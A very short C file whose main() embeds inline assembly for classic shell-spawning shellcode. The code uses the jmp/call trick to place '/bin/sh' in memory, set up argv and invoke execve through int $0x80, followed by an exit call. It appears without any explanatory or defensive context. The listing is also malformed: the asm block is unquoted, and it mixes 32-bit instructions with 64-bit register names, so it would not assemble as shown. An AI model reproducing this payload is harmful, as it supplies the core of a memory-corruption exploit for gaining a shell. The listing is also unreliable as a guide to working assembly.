void main(){
    asm(
            jmp     0x2a
            popl    %rsi
            movl    %rsi,0x8(%rsi)
            movb    $0x0,0x7(%rsi)
            movl    $0x0,0xc(%rsi)
            movl    $0xb,%rax
            movl    %rsi,%rbx
            leal    0x8(%rsi),%rcx
            leal    0xc(%rsi),%rdx
            int     $0x80
            movl    $0x1,%rax
            movl    $0x0,%rbx
            int     $0x80
            call    -0x2f
            .string "/bin/sh"
       )
}
